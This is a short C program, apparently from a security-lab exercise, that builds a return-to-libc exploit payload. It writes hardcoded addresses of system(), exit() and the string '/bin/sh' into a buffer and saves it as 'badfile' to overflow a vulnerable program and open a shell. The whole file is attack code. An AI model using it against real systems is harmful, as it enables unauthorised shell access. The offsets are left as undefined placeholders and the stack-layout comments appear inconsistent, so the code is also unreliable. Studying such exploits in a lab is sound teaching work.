/* exploit.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define SHELL_LOC 0xbfe40f65
#define SYSTEM_LOC 0xb74acda0
#define EXIT_LOC 0xb74a09d0
int main(int argc, char **argv)
{
	char buf[40];
	FILE *badfile;
	badfile = fopen("./badfile", "w");
	/* /bin/sh has to be input for system()
	   has to be in $ebp + 4 */
	*(long *) &buf[X] = SHELL_LOC ; // "/bin/sh" ✰
	/* system() has to overwrite return address
	   $ebp + 12 */
	*(long *) &buf[Y] = SYSTEM_LOC ; // system() ✰
	/* exit must go in $ebp + 8 */
	*(long *) &buf[Z] = EXIT_LOC ; // exit() ✰
	fwrite(buf, sizeof(buf), 1, badfile);
	fclose(badfile);
}
